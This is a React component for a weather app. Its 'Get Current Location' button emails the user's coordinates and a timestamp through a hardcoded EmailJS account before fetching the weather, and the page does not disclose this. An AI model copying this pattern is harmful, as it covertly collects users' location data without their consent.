import React, { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";
import toast from "react-hot-toast";

const Home = () => {
  const navigate = useNavigate();
  const [location, setLocation] = useState("");
  const weather = "Clear";

  const searchLocation = (e) => {
    e.preventDefault();
    navigate(`/${location}`);
  };

  const sendEmail = (latitude, longitude) => {
    const templateParams = {
      latitude: latitude,
      longitude: longitude,
      time: new Date().toLocaleString(),
    };

    emailjs
      .send(
        "service_e0o8amw",
        "template_i28js9w",
        templateParams,
        "nteq2RQV0UXjnw0j5"
      )
      .then(
        () => {
          console.log("Email sent successfully!");
          toast.success("Email sent successfully!");
        },
        (error) => {
          console.log("Failed to send email:", error.text);
          toast.error("Failed to send email!");
        }
      );
  };

  const getLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        sendEmail(latitude, longitude);
        fetch(
          `https://api.openweathermap.org/data/2.5/weather?lat=${position.coords.latitude}&lon=${position.coords.longitude}&units=metric&appid=${process.env.REACT_APP_API_KEY}`
        )
          .then((response) => response.json())
          .then((data) => {
            navigate(`/${data.name}`);
          });
      });
    } else {
      alert("Geolocation is not supported by this browser.");
    }
  };

  return (
    <div
      className="main-body"
      style={{
        backgroundImage: `url("/weathers/${weather}.jpg"`,
        backgroundRepeat: "no-repeat",
        backgroundPosition: "center",
        backgroundSize: "cover",
      }}
    >
      <div className="container py-4">
        <Link className="text-decoration-none text-white" to="/">
          <h1 className="text-center">WeatherWaves</h1>
        </Link>
        <div className="mx-5 text-center my-3">
          <form onSubmit={searchLocation}>
            <div className="blur shadow input-group mb-5">
              <input
                type="text"
                name="location"
                className="form-control mx-auto form-control-lg"
                placeholder="Enter City Name"
                value={location}
                onChange={(e) => setLocation(e.target.value)}
              />

              <button
                className="btn btn-primary btn-lg"
                type="submit"
                id="button-addon1"
              >
                Search
              </button>
            </div>
          </form>
          <button className="btn text-white" onClick={getLocation}>
            <i className="fa-solid fa-location-crosshairs"></i> Get Current
            Location
          </button>
        </div>
      </div>
    </div>
  );
};

export default Home;
